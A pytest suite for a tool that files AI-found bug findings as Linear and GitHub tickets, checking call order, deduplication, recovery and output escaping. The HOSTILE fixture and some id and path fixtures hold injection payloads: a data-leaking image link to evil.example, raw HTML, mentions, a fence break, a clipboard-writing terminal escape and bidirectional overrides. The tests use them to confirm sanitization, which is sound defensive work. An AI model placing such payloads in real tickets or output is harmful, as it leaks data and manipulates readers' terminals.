"""TK1 with fake trackers: no network, no token, nothing posted. Each test checks the calls a ticket makes, what they
carry, and that model text never reaches a tracker as anything but inert code."""

from __future__ import annotations

import json
import re
import uuid
from collections.abc import Callable, Mapping
from pathlib import Path
from typing import Literal

import pytest

from receipts.contracts import (
    CatchKind,
    FailureType,
    Finding,
    LedgerEntry,
    Lens,
    Outcome,
    ReplayKey,
    Repro,
    RunResult,
    Side,
    StageCost,
    Status,
)
from receipts.surface import tickets
from receipts.surface.ledger import InvalidEntryError, JsonlLedger
from receipts.surface.tickets import (
    BODY_LIMIT,
    MAX_CALLS,
    CallBudget,
    CallBudgetError,
    GitHubIssueWriter,
    LinearTicketWriter,
    RateLimitedError,
    TicketError,
    TicketRefusedError,
    TrackerError,
    draft_ticket,
    finding_spend,
    issue_uuid,
    latest_entry,
    receipt_key,
    receipt_url,
)

Rendered = Callable[[str], str]

BASE = "https://receipts.example.test/r"
TARGET = "20260217_mini-v2.0.0_gemini-3-flash-high~django__django-11099"
CLAIM = "fixed_x"
FID = f"{TARGET}/{CLAIM}/a1"
ASSET = "https://uploads.linear.app/org/0f0f/repro.txt"
# Model text that tries every way out: an image and a link that leak data, raw HTML, a mention, a fence that would
# close the block around it, a terminal escape and a bidirectional override.
HOSTILE = (
    "![p](https://evil.example/p.png?d=secret) [docs](http://evil.example/x) <img src=//evil.example/i.png> "
    "@everyone www.evil.example\n```\n````\n# heading\x1b]52;c;ZXZpbA==\x07\N{RIGHT-TO-LEFT OVERRIDE}end"
)
RAW = ("\x1b", "\x07", "\N{RIGHT-TO-LEFT OVERRIDE}")


def blocker(
    *,
    kind: CatchKind = CatchKind.FIX_VALIDITY,
    hostile: str = "",
    status: Status = Status.BLOCKER,
    files: dict[str, str] | None = None,
    detail: str | None = None,
    refutation: str | None = None,
    cases: tuple[str, ...] = (),
    stdout: str | None = None,
    stderr: str = "",
    extra_runs: tuple[RunResult, ...] = (),
    target: str = TARGET,
    quote: str | None = None,
    command: tuple[str, ...] | None = None,
) -> LedgerEntry:
    fail = RunResult(
        side=Side.PATCH,
        outcome=Outcome.FAIL,
        failure_type=FailureType.ASSERTION,
        exit_code=1,
        fresh_container=True,
        duration_s=2.5,
        stdout_tail=f"E   AssertionError: assert None == []\n{hostile}" if stdout is None else stdout,
        stderr_tail=stderr,
    )
    other = (
        (RunResult(side=Side.SURROGATE, outcome=Outcome.PASS, exit_code=0, fresh_container=True, duration_s=2.0),)
        if kind is not CatchKind.REGRESSION
        else tuple(
            RunResult(side=Side.BASE, outcome=Outcome.PASS, exit_code=0, fresh_container=True, duration_s=2.0)
            for _ in range(5)
        )
    )
    repro = Repro(
        id="r1",
        attack_id="a1",
        claim_id=CLAIM,
        lens=Lens.CORRECTNESS,
        kind=kind,
        files=files or {"tests/test_receipts_1.py": f"def test_empty():\n    assert first([]) is None  # {hostile}\n"},
        command=command or ("python", "-m", "pytest", f"tests/test_receipts_1.py::{hostile[:30]}"),
        cases=cases,
    )
    finding = Finding(
        id=f"{target}/{CLAIM}/a1",
        target_id=target,
        claim_id=CLAIM,
        lens=Lens.CORRECTNESS,
        status=Status.BLOCKER,
        kind=kind,
        repro=repro,
        runs=(fail,) * 5 + other + extra_runs,
        quote=quote if quote is not None else f"Calling first() on an empty list returns None. {hostile}",
        refutation=refutation if refutation is not None else (f"The test may be wrong. {hostile}" if hostile else None),
        detail=detail,
        replay=ReplayKey(base_sha="a" * 40, patch_sha="b" * 40, harness_hash="h1", seed=7, image_digest="sha256:d"),
        costs=(StageCost(stage="attack", model="muse-spark-1.3", micro_usd=123_456),),
    )
    if status is not Status.BLOCKER:
        # A finding that kept its repro and kind but is not a blocker: suspected, flaky or refuted.
        finding = Finding(
            id=FID,
            target_id=TARGET,
            claim_id=CLAIM,
            lens=Lens.CORRECTNESS,
            status=status,
            kind=kind,
            repro=repro,
            runs=(fail,) * 5 + other,
            quote="x",
        )
    return LedgerEntry(at="2026-10-27T10:00:00Z", receipts_version="0.0.1", finding=finding)


# ---------------------------------------------------------------- fake trackers


Handler = Callable[[Mapping[str, object]], Mapping[str, object]]


class FakeLinear:
    """A Linear that answers each operation from a script and records every call, in order."""

    def __init__(self, **handlers: Handler) -> None:
        self.calls: list[tuple[str, dict[str, object]]] = []
        self.uploads: list[tuple[str, dict[str, str], bytes]] = []
        self.upload_error: TrackerError | None = None
        defaults: dict[str, Handler] = {
            "ReceiptTicket": lambda v: {"attachmentsForURL": {"nodes": []}},
            "ReceiptUpload": lambda v: {
                "fileUpload": {
                    "success": True,
                    "uploadFile": {
                        "uploadUrl": "https://uploads.linear.app/signed?sig=1",
                        "assetUrl": ASSET,
                        "headers": [{"key": "x-goog-meta", "value": "1"}],
                    },
                }
            },
            "ReceiptIssue": lambda v: {
                "issueCreate": {
                    "success": True,
                    "issue": {"id": _input(v)["id"], "identifier": "FAL-900", "url": "https://linear.app/f/FAL-900"},
                }
            },
            "ReceiptIssueById": lambda v: {
                "issue": {"id": v["id"], "identifier": "FAL-900", "url": "https://linear.app/f/FAL-900"}
            },
            "ReceiptAttach": lambda v: {"attachmentCreate": {"success": True, "attachment": {"id": "att-1"}}},
        }
        self.handlers: dict[str, Handler] = defaults | handlers

    def graphql(self, query: str, variables: Mapping[str, object]) -> Mapping[str, object]:
        name = re.search(r"(?:query|mutation) (\w+)", query)
        assert name is not None, query
        self.calls.append((name.group(1), json.loads(json.dumps(variables))))
        return self.handlers[name.group(1)](variables)

    def upload(self, url: str, headers: Mapping[str, str], content: bytes) -> None:
        self.calls.append(("PUT", {"url": url}))
        self.uploads.append((url, dict(headers), content))
        if self.upload_error is not None:
            raise self.upload_error

    def names(self) -> list[str]:
        return [name for name, _ in self.calls]

    def sent(self, name: str) -> dict[str, object]:
        [variables] = [v for n, v in self.calls if n == name]
        return variables


def _input(variables: Mapping[str, object]) -> dict[str, object]:
    value = variables["input"]
    assert isinstance(value, dict)
    return value


def refuse(message: str) -> Handler:
    def handler(variables: Mapping[str, object]) -> Mapping[str, object]:
        raise TrackerError(message)

    return handler


class FakeGitHub:
    def __init__(self, search_items: list[dict[str, object]] | None = None) -> None:
        self.calls: list[tuple[str, str, dict[str, str] | None, dict[str, object] | None]] = []
        self.search_items = search_items or []

    def request(
        self,
        method: Literal["GET", "POST"],
        path: str,
        *,
        params: Mapping[str, str] | None = None,
        body: Mapping[str, object] | None = None,
    ) -> object:
        self.calls.append((method, path, dict(params) if params else None, dict(body) if body else None))
        if method == "GET":
            return {"total_count": len(self.search_items), "items": self.search_items}
        return {"number": 45, "html_url": "https://github.com/falden/demo/issues/45", "node_id": "I_1"}


def linear_writer(fake: FakeLinear) -> LinearTicketWriter:
    return LinearTicketWriter(fake, team_id="team-1", receipt_base=BASE, label_ids=("label-1",), priority=2)


def everything_sent(fake: FakeLinear) -> str:
    """Every byte a Linear ticket sent: all variables, and each upload's URL, headers and content."""
    parts = [json.dumps(v, ensure_ascii=False) for _, v in fake.calls]
    parts += [f"{url} {json.dumps(headers)} {content.decode()}" for url, headers, content in fake.uploads]
    return "\n".join(parts)


# ---------------------------------------------------------------- Linear


def test_a_new_linear_ticket_takes_five_calls_in_order() -> None:
    fake = FakeLinear()
    result = linear_writer(fake).file(blocker(), spent_micro_usd=123_456)
    assert fake.names() == ["ReceiptTicket", "ReceiptUpload", "PUT", "ReceiptIssue", "ReceiptAttach"]
    url = receipt_url(BASE, FID)
    assert (result.outcome, result.calls, result.issue_identifier, result.receipt_url) == ("created", 5, "FAL-900", url)
    assert result.upload_error is None
    assert fake.sent("ReceiptTicket") == {"url": url}  # deduped by the stable receipt URL
    issue = _input(fake.sent("ReceiptIssue"))
    assert issue["id"] == issue_uuid(url)
    assert (issue["teamId"], issue["labelIds"], issue["priority"]) == ("team-1", ["label-1"], 2)
    assert issue["title"] == f"Receipts: fix-validity catch on fixed_x in {TARGET}"
    description = str(issue["description"])
    assert f"- Receipt: <{url}>\n" in description
    assert f"- Repro file: [receipts-repro-{receipt_key(url)[-12:]}.txt]({ASSET})\n" in description
    assert "The repro fails on the agent's change in 5 of 5 runs (assertion), and passes on 1 plausible" in description
    attach = _input(fake.sent("ReceiptAttach"))
    assert (attach["issueId"], attach["url"], attach["title"]) == (result.issue_id, url, "Falden Receipts")
    metadata = attach["metadata"]
    assert isinstance(metadata, dict)
    attributes = {a["name"]: a["value"] for a in metadata["attributes"]}
    assert attributes["Kind"] == "fix-validity catch"
    assert attributes["Fails on the patch"] == "5 of 5 runs"
    assert attributes["Passes"] == "on 1 plausible independent fix"
    assert attributes["Finding"] == FID
    assert attributes["Spend"] == "$0.123456"
    [(put_url, headers, content)] = fake.uploads
    assert put_url == "https://uploads.linear.app/signed?sig=1"
    assert headers["Content-Type"] == "text/plain; charset=utf-8" and headers["x-goog-meta"] == "1"
    assert headers["Cache-Control"] == "public, max-age=31536000"  # as Linear's upload guide sends it
    assert "projectId" not in issue  # no project unless the writer names one
    assert _input(fake.sent("ReceiptIssue"))["id"] == str(uuid.UUID(str(issue["id"])))
    assert fake.sent("ReceiptUpload")["size"] == len(content)


def test_a_ticket_already_filed_is_found_and_not_filed_again() -> None:
    existing = {"id": "iss-1", "identifier": "FAL-12", "url": "https://linear.app/f/FAL-12"}
    fake = FakeLinear(ReceiptTicket=lambda v: {"attachmentsForURL": {"nodes": [{"id": "att", "issue": existing}]}})
    result = linear_writer(fake).file(blocker())
    assert fake.names() == ["ReceiptTicket"]
    assert (result.outcome, result.calls, result.issue_identifier) == ("existing", 1, "FAL-12")


def test_a_crash_between_create_and_attach_is_recovered_on_the_next_run() -> None:
    # The earlier run created the issue under its derived id and died before attaching the receipt URL, so the
    # lookup finds nothing and the create is refused as a duplicate: the writer finds that issue and attaches it.
    fake = FakeLinear(ReceiptIssue=refuse("Linear refused the call: entity already exists"))
    result = linear_writer(fake).file(blocker())
    assert fake.names() == [
        "ReceiptTicket",
        "ReceiptUpload",
        "PUT",
        "ReceiptIssue",
        "ReceiptIssueById",
        "ReceiptAttach",
    ]
    assert (result.outcome, result.calls) == ("recovered", MAX_CALLS)
    assert fake.sent("ReceiptIssueById") == {"id": issue_uuid(receipt_url(BASE, FID))}
    assert _input(fake.sent("ReceiptAttach"))["issueId"] == issue_uuid(receipt_url(BASE, FID))


def test_a_create_that_fails_for_another_reason_raises_its_own_error() -> None:
    fake = FakeLinear(
        ReceiptIssue=refuse("Linear refused the call: title too long"), ReceiptIssueById=refuse("Entity not found")
    )
    with pytest.raises(TrackerError, match="title too long"):
        linear_writer(fake).file(blocker())
    assert "ReceiptAttach" not in fake.names()


@pytest.mark.parametrize("failure", ["not prepared", "the PUT failed", "an asset URL elsewhere"])
def test_a_failed_upload_files_the_ticket_without_the_link(failure: str) -> None:
    fake = FakeLinear()
    if failure == "not prepared":
        fake.handlers["ReceiptUpload"] = lambda v: {"fileUpload": {"success": False, "uploadFile": None}}
    elif failure == "the PUT failed":
        fake.upload_error = TrackerError("the upload answered HTTP 403")
    else:
        good = fake.handlers["ReceiptUpload"]({})
        upload = json.loads(json.dumps(good))
        upload["fileUpload"]["uploadFile"]["assetUrl"] = "https://evil.example/x.txt"
        fake.handlers["ReceiptUpload"] = lambda v: upload
    result = linear_writer(fake).file(blocker())
    assert result.outcome == "created" and result.upload_error
    assert "Repro file:" not in str(_input(fake.sent("ReceiptIssue"))["description"])
    assert "evil" not in everything_sent(fake)
    assert result.calls == (5 if failure == "the PUT failed" else 4)


@pytest.mark.parametrize("status", [Status.SUSPECTED, Status.FLAKY, Status.REFUTED, Status.S_SAT_INCONCLUSIVE])
def test_only_a_blocker_becomes_a_ticket_and_nothing_is_called(status: Status) -> None:
    fake = FakeLinear()
    with pytest.raises(TicketRefusedError, match="only a blocker"):
        linear_writer(fake).file(blocker(status=status))
    assert fake.calls == []
    github = FakeGitHub()
    with pytest.raises(TicketRefusedError, match="only a blocker"):
        GitHubIssueWriter(github, repo="falden/demo", receipt_base=BASE).file(blocker(status=status))
    assert github.calls == []


def test_an_entry_that_skipped_validation_is_refused_before_any_call() -> None:
    fake = FakeLinear()
    entry = blocker()
    bad = entry.model_copy(update={"finding": entry.finding.model_copy(update={"wall_seconds": float("inf")})})
    with pytest.raises(InvalidEntryError):
        linear_writer(fake).file(bad)
    unvalidated = entry.model_copy(update={"finding": entry.finding.model_copy(update={"repro": None})})
    with pytest.raises(InvalidEntryError):
        linear_writer(fake).file(unvalidated)
    assert fake.calls == []


def test_a_rate_limited_lookup_stops_the_ticket() -> None:
    def limited(variables: Mapping[str, object]) -> Mapping[str, object]:
        raise RateLimitedError("Linear rate limited the call", retry_after=30)

    fake = FakeLinear(ReceiptTicket=limited)
    with pytest.raises(RateLimitedError):
        linear_writer(fake).file(blocker())
    assert fake.names() == ["ReceiptTicket"]


def test_the_call_budget_refuses_the_seventh_call() -> None:
    calls = CallBudget()
    for i in range(MAX_CALLS):
        calls.spend(f"call {i + 1}")
    with pytest.raises(CallBudgetError, match="at most 6 calls; one more would be call 7"):
        calls.spend("one more")
    assert MAX_CALLS == 6


def test_a_linear_ticket_never_sends_model_text_as_markdown(rendered: Rendered) -> None:
    fake = FakeLinear()
    linear_writer(fake).file(blocker(hostile=HOSTILE))
    sent = everything_sent(fake)
    assert not [x for x in ("evil", "secret", *RAW) if x in sent]  # stripped and escaped everywhere, uploads too
    description = str(_input(fake.sent("ReceiptIssue"))["description"])
    outside = rendered(description)
    for marker in ("@everyone", "<img", "![", "# heading", "[docs]"):
        assert marker in description  # still shown, as text
        assert marker not in outside  # but only inside code, where nothing renders
    assert "Calling first() on an empty list returns None." not in outside
    issue = _input(fake.sent("ReceiptIssue"))
    assert "\n" not in str(issue["title"]) and "@" not in str(issue["title"])
    metadata = _input(fake.sent("ReceiptAttach"))["metadata"]
    assert "everyone" not in json.dumps(metadata)  # attributes hold ids, enums and counts, never model text
    [(_, _, content)] = fake.uploads
    text = content.decode()
    assert "Links are removed from this copy" in text and "[link removed]" in text


def test_a_regression_catch_says_it_passes_on_base() -> None:
    draft = draft_ticket(blocker(kind=CatchKind.REGRESSION), receipt_base=BASE)
    assert "passes on the code before the change in 5 of 5 runs." in draft.body
    assert draft.title.startswith("Receipts: regression catch on fixed_x")


def test_many_repro_files_are_named_past_the_budget() -> None:
    files = {f"tests/test_receipts_{i}.py": "x = 1\n" * 1500 for i in range(8)}  # 9,000 characters each
    draft = draft_ticket(blocker(files=files), receipt_base=BASE)
    assert len(draft.body) < 60_000
    assert "**More repro files**, shown in the ledger only:" in draft.body
    assert "more characters cut; the full file is in the ledger" in draft.body


def test_a_finding_is_filed_at_its_latest_entry(tmp_path: Path) -> None:
    ledger = JsonlLedger(tmp_path / "ledger.jsonl")
    suspected, confirmed = blocker(status=Status.SUSPECTED), blocker()
    ledger.append(suspected)
    ledger.append(confirmed)
    assert latest_entry(ledger, FID) == confirmed
    fake = FakeLinear()
    assert linear_writer(fake).file(latest_entry(ledger, FID)).outcome == "created"
    with pytest.raises(TicketRefusedError, match="no finding"):
        latest_entry(ledger, f"{TARGET}/{CLAIM}/nope")


# ---------------------------------------------------------------- receipt URLs and ids


def test_receipt_urls_are_stable_and_stay_under_their_base() -> None:
    assert receipt_url(BASE, FID) == f"{BASE}/{TARGET}/{CLAIM}/a1"
    assert receipt_url(BASE + "/", FID) == receipt_url(BASE, FID)
    assert receipt_url(BASE, "t1/tests_pass:0123456789/x/../y") == f"{BASE}/t1/tests_pass%3A0123456789/x%2F..%2Fy"
    assert receipt_url(BASE, "./../a") == f"{BASE}/%2E/%2E%2E/a"
    assert receipt_url(BASE, "t?x/c#y/a b") == f"{BASE}/t%3Fx/c%23y/a%20b"
    for bad in (
        "http://receipts.example.test",
        "https://a.test/r?x=1",
        "https://a.test/r#f",
        "https://u@a.test/r",
        "x",
    ):
        with pytest.raises(ValueError, match="https"):
            receipt_url(bad, FID)
    with pytest.raises(ValueError, match="finding id"):
        receipt_url(BASE, "t1/c1")


def test_receipt_keys_and_issue_ids_are_derived_from_the_url() -> None:
    url = receipt_url(BASE, FID)
    key = receipt_key(url)
    assert re.fullmatch(r"faldenreceipt[0-9a-f]{20}", key) and receipt_key(url) == key
    assert receipt_key(receipt_url(BASE, f"{TARGET}/{CLAIM}/a2")) != key
    issue = uuid.UUID(issue_uuid(url))
    assert issue.version == 4 and issue.variant == uuid.RFC_4122
    assert issue_uuid(url) == str(issue) and issue_uuid(url + "x") != str(issue)


def test_a_writer_refuses_a_bad_configuration() -> None:
    with pytest.raises(ValueError, match="https"):
        LinearTicketWriter(FakeLinear(), team_id="t", receipt_base="http://x.test")
    with pytest.raises(ValueError, match="team"):
        LinearTicketWriter(FakeLinear(), team_id="", receipt_base=BASE)
    with pytest.raises(ValueError, match="priorities"):
        LinearTicketWriter(FakeLinear(), team_id="t", receipt_base=BASE, priority=5)
    for bad in ("falden", "falden/..", "../x", "a/b/c", "-a/b", "a/b c"):
        with pytest.raises(ValueError, match="owner/name"):
            GitHubIssueWriter(FakeGitHub(), repo=bad, receipt_base=BASE)
    with pytest.raises(ValueError, match="owner/name"):
        GitHubIssueWriter(FakeGitHub(), repo="falden/demo", receipt_base=BASE, post_repos=frozenset({"x/.."}))


# ---------------------------------------------------------------- GitHub


def test_github_writes_drafts_unless_the_repository_is_named() -> None:
    fake = FakeGitHub()
    result = GitHubIssueWriter(fake, repo="django/django", receipt_base=BASE).file(blocker())
    assert (result.outcome, result.calls, fake.calls) == ("draft", 0, [])
    assert result.draft is not None
    assert "**Attributes**" in result.draft.body and "- Kind: `fix-validity catch`" in result.draft.body
    assert f"Receipt key: {receipt_key(receipt_url(BASE, FID))}" in result.draft.body
    other = GitHubIssueWriter(fake, repo="django/django", receipt_base=BASE, post_repos=frozenset({"falden/demo"}))
    assert other.file(blocker()).outcome == "draft" and fake.calls == []


def test_github_searches_then_creates_in_a_named_repository() -> None:
    fake = FakeGitHub()
    writer = GitHubIssueWriter(
        fake, repo="falden/demo", receipt_base=BASE, post_repos=frozenset({"Falden/Demo"}), labels=("receipts",)
    )
    result = writer.file(blocker())
    key = receipt_key(receipt_url(BASE, FID))
    assert [(m, p) for m, p, _, _ in fake.calls] == [("GET", "/search/issues"), ("POST", "/repos/falden/demo/issues")]
    params, body = fake.calls[0][2], fake.calls[1][3]
    assert params == {"q": f"{key} repo:falden/demo is:issue in:body", "per_page": "20"}
    assert body is not None and body["labels"] == ["receipts"]
    assert key in str(body["body"]) and receipt_url(BASE, FID) in str(body["body"])
    assert (result.outcome, result.calls, result.issue_identifier) == ("created", 2, "#45")


def test_github_finds_its_own_issue_and_only_its_own() -> None:
    url = receipt_url(BASE, FID)
    key = receipt_key(url)
    mine = {"number": 7, "html_url": "https://github.com/falden/demo/issues/7", "body": f"x {url} y {key}"}
    lookalike = {"number": 8, "html_url": "https://github.com/falden/demo/issues/8", "body": f"mentions {key} only"}
    fake = FakeGitHub([lookalike, mine])
    result = GitHubIssueWriter(fake, repo="falden/demo", receipt_base=BASE, post_repos=frozenset({"falden/demo"})).file(
        blocker()
    )
    assert (result.outcome, result.calls, result.issue_identifier) == ("existing", 1, "#7")
    fake = FakeGitHub([lookalike])
    result = GitHubIssueWriter(fake, repo="falden/demo", receipt_base=BASE, post_repos=frozenset({"falden/demo"})).file(
        blocker()
    )
    assert (result.outcome, result.calls) == ("created", 2)


def test_a_github_ticket_never_sends_model_text_as_markdown(rendered: Rendered) -> None:
    fake = FakeGitHub()
    GitHubIssueWriter(fake, repo="falden/demo", receipt_base=BASE, post_repos=frozenset({"falden/demo"})).file(
        blocker(hostile=HOSTILE)
    )
    sent = json.dumps([c[2:] for c in fake.calls], ensure_ascii=False)
    assert not [x for x in ("evil", "secret", *RAW) if x in sent]
    body = fake.calls[1][3]
    assert body is not None
    outside = rendered(str(body["body"]))
    assert not [m for m in ("@everyone", "<img", "![", "# heading") if m in outside]


# ---------------------------------------------------------------- contract v3: detail, refutation, problem, cases


def blocks_after(body: str, heading: str) -> str:
    """The first fenced code block after `heading`, fences and all."""
    lines = body[body.index(heading) + len(heading) :].split("\n")
    start = next(i for i, line in enumerate(lines) if line.startswith("```"))
    opened = re.match(r"`+", lines[start])
    assert opened is not None
    end = next(i for i in range(start + 1, len(lines)) if lines[i] == opened.group())
    return "\n".join(lines[start : end + 1])


def test_a_v3_finding_shows_its_detail_and_a_refutation_apart(rendered: Rendered) -> None:
    detail = "Failed on the patch in 5 of 5 fresh runs and passed on 1 plausible surrogate."
    refutation = "The repro may pin behavior the issue never asked for."
    body = draft_ticket(blocker(detail=detail, refutation=refutation), receipt_base=BASE).body
    assert detail in blocks_after(body, "**Why it is a blocker**, as Receipts recorded it:")
    assert refutation in blocks_after(body, "**Different-model refutation**: what a different model offered")
    assert body.index("**Why it is a blocker**") < body.index("**Different-model refutation**")
    outside = rendered(body)
    assert detail not in outside and refutation not in outside  # both are shown only as code
    only_detail = draft_ticket(blocker(detail=detail), receipt_base=BASE).body
    assert "**Why it is a blocker**" in only_detail and "refutation" not in only_detail.lower()
    only_refutation = draft_ticket(blocker(refutation=refutation), receipt_base=BASE).body
    assert "**Different-model refutation**" in only_refutation and "**Why it is a blocker**" not in only_refutation


def v2_line(entry: LedgerEntry) -> bytes:
    """The entry as contract v2 wrote it: no Finding.detail, Repro.cases or RunResult.problem key."""
    data = json.loads(entry.model_dump_json())
    finding = data["finding"]
    del finding["detail"]
    del finding["repro"]["cases"]
    for run in finding["runs"]:
        del run["problem"]
    return json.dumps(data).encode()


@pytest.mark.parametrize("refutation", [None, "A different model says the issue allows []."])
def test_a_v2_finding_still_drafts_with_its_refutation_labeled(refutation: str | None) -> None:
    line = v2_line(blocker(refutation=refutation))
    assert b'"detail"' not in line and b'"cases"' not in line and b'"problem"' not in line
    entry = LedgerEntry.model_validate_json(line, strict=True)
    body = draft_ticket(entry, receipt_base=BASE).body
    assert "**Why it is a blocker**" not in body and "**Cases it runs**" not in body
    if refutation is None:
        assert "refutation" not in body.lower()
    else:
        assert refutation in blocks_after(body, "**Different-model refutation**")


def test_a_run_problem_is_shown_beside_its_outcome(rendered: Rendered) -> None:
    errored = RunResult(
        side=Side.SURROGATE,
        outcome=Outcome.ERROR,
        failure_type=FailureType.INFRA,
        exit_code=2,
        fresh_container=True,
        duration_s=3.0,
        problem="the run wrote no report | see https://evil.example/x \N{RIGHT-TO-LEFT OVERRIDE}\nsecond line",
    )
    body = draft_ticket(blocker(extra_runs=(errored,)), receipt_base=BASE).body
    table = blocks_after(body, "**Runs**, with why a run could not be read where one could not:")
    header, *rows = table.split("\n")[1:-1]
    assert header.split() == ["#", "side", "outcome", "failure", "exit", "fresh", "seconds", "problem"]
    row = rows[-1]
    assert row.split()[:7] == ["7", "surrogate", "error", "infra", "2", "yes", "3.0"]
    assert row.endswith("the run wrote no report | see [link removed] \\u202e second line")
    assert all(r.split()[2] == "fail" for r in rows[:5]) and len(rows) == 7
    assert "evil" not in body and "\N{RIGHT-TO-LEFT OVERRIDE}" not in body
    assert "no report" not in rendered(body)  # the problem sits inside code, beside its outcome


@pytest.mark.parametrize(
    ("stdout", "stderr", "shown"),
    [
        ("", "FAIL: test_x (queries.test_receipts_x.T)\nAssertionError: 2 != 1\n", ["stderr"]),
        ("E   AssertionError: assert None == []\n", "", ["stdout"]),
        ("E   AssertionError: assert None == []\n", "warning: a deprecation on stderr\n", ["stdout", "stderr"]),
    ],
    ids=["django, stderr only", "pytest, stdout only", "both"],
)
def test_the_failing_runs_output_is_shown_from_both_streams(stdout: str, stderr: str, shown: list[str]) -> None:
    body = draft_ticket(blocker(stdout=stdout, stderr=stderr), receipt_base=BASE).body
    headings = re.findall(r"\*\*Output of the first failing patch run\*\*, its (\w+),", body)
    assert headings == shown
    for stream, text in (("stdout", stdout), ("stderr", stderr)):
        if stream in shown:
            assert text.strip().split("\n")[-1] in blocks_after(body, f"run**, its {stream},")


ZWSP = "\N{ZERO WIDTH SPACE}"


def test_hidden_characters_cannot_make_a_blocker_unfileable() -> None:
    # Every limit counts characters as shown: each zero-width space shows as 6. Before, four files of 8,000 made a
    # body of 181,821 characters that could be neither filed nor drafted.
    files = {f"tests/test_receipts_{i}.py": ZWSP * 8_000 for i in range(4)}
    entry = blocker(
        files=files,
        quote=ZWSP * 10_000,
        detail=ZWSP * 10_000,
        refutation=ZWSP * 10_000,
        cases=tuple(f"tests/test_receipts_0.py::test_{i}{ZWSP * 50}" for i in range(200)),
        stdout=(ZWSP * 100 + "\n") * 100,
        stderr=(ZWSP * 100 + "\n") * 100,
        command=("python", "-m", "pytest", ZWSP * 5_000),
    )
    draft = draft_ticket(entry, receipt_base=BASE)
    assert len(draft.body) <= BODY_LIMIT
    assert draft.body.count("more characters cut") >= 6
    assert ZWSP not in draft.body and "\\u200b" in draft.body
    # A cut never splits an escape: what is kept before a cut note is whole escapes.
    kept = blocks_after(draft.body, "**The sentence it breaks**").split("\n")[1]
    assert kept and len(kept) % len("\\u200b") == 0 and set(kept.split("\\u200b")) == {""}


def test_a_backtick_run_cannot_lengthen_a_fence_past_its_cap() -> None:
    files = {"tests/test_receipts_1.py": "`" * 20_000}
    draft = draft_ticket(blocker(files=files, quote="`" * 5_000), receipt_base=BASE)
    fences = re.findall(r"^(`{3,})", draft.body, re.M)
    assert fences and max(len(f) for f in fences) <= 16
    assert len(draft.body) <= BODY_LIMIT


def test_the_body_limit_refuses_a_ticket_over_it(monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setattr(tickets, "BODY_LIMIT", 1_000)
    with pytest.raises(TicketError, match="characters, over 1,000"):
        draft_ticket(blocker(), receipt_base=BASE)
    fake = FakeLinear()
    with pytest.raises(TicketError):
        linear_writer(fake).file(blocker())
    assert fake.calls == []  # refused before any call


def test_a_linear_issue_goes_to_the_writers_project() -> None:
    fake = FakeLinear()
    LinearTicketWriter(fake, team_id="team-1", receipt_base=BASE, project_id="proj-1").file(blocker())
    issue = _input(fake.sent("ReceiptIssue"))
    assert issue["projectId"] == "proj-1" and "labelIds" not in issue and "priority" not in issue


HIDDEN_ID = "t\N{RIGHT-TO-LEFT OVERRIDE}\x9b2J\N{ZERO WIDTH SPACE}"  # what contract v2 lets an id hold


def test_ids_and_paths_reach_a_ticket_only_escaped(rendered: Rendered) -> None:
    raw = ("\N{RIGHT-TO-LEFT OVERRIDE}", "\x9b", "\N{ZERO WIDTH SPACE}")
    path = "tests/x\N{RIGHT-TO-LEFT OVERRIDE} https://evil.example/y.py"
    case = "tests/test_receipts_1.py::test_x\N{RIGHT-TO-LEFT OVERRIDE}"
    entry = blocker(target=HIDDEN_ID, files={path: "assert False\n"}, cases=(case,))
    fake = FakeLinear()
    linear_writer(fake).file(entry)
    sent = everything_sent(fake)
    assert not [ch for ch in raw if ch in sent]
    assert "evil" not in sent
    description = str(_input(fake.sent("ReceiptIssue"))["description"])
    assert "- Finding: `t\\u202e\\u009b2J\\u200b/fixed_x/a1`" in description
    assert "\\u202e" not in rendered(description)  # the ids show only inside code spans
    [(_, _, content)] = fake.uploads
    text = content.decode()
    assert "# ---- file tests/x\\u202e [link removed]" in text
    assert "# case: tests/test_receipts_1.py::test_x\\u202e" in text


def test_the_cases_a_repro_runs_are_shown_as_code(rendered: Rendered) -> None:
    cases = ("tests/test_receipts_1.py::test_regressed", "tests/test_receipts_1.py::test_other")
    body = draft_ticket(blocker(cases=cases), receipt_base=BASE).body
    block = blocks_after(body, "**Cases it runs**, as its runner names them:")
    assert block.split("\n")[1:3] == list(cases)
    assert "test_regressed" not in rendered(body)
    assert "**Cases it runs**" not in draft_ticket(blocker(), receipt_base=BASE).body  # empty: every case its files


def test_spend_is_the_whole_findings_and_never_one_entrys(tmp_path: Path) -> None:
    ledger = JsonlLedger(tmp_path / "ledger.jsonl")
    first = blocker(status=Status.SUSPECTED)
    first = first.model_copy(
        update={"finding": first.finding.model_copy(update={"costs": (StageCost(stage="attack", micro_usd=400_000),)})}
    )
    ledger.append(validated_entry(first))
    ledger.append(blocker())  # its own step spent 123,456
    assert finding_spend(ledger, FID) == 523_456
    fake = FakeLinear()
    linear_writer(fake).file(latest_entry(ledger, FID), spent_micro_usd=finding_spend(ledger, FID))
    attributes = {a["name"]: a["value"] for a in _metadata_attributes(fake)}
    assert attributes["Spend"] == "$0.523456"
    fake = FakeLinear()
    linear_writer(fake).file(latest_entry(ledger, FID))
    assert "Spend" not in {a["name"] for a in _metadata_attributes(fake)}  # one entry's costs are not the finding's
    with pytest.raises(ValueError, match="not negative"):
        draft_ticket(blocker(), receipt_base=BASE, spent_micro_usd=-1)


def validated_entry(entry: LedgerEntry) -> LedgerEntry:
    return LedgerEntry.model_validate_json(entry.model_dump_json(), strict=True)


def _metadata_attributes(fake: FakeLinear) -> list[dict[str, str]]:
    metadata = _input(fake.sent("ReceiptAttach"))["metadata"]
    assert isinstance(metadata, dict)
    attributes = metadata["attributes"]
    assert isinstance(attributes, list)
    return attributes
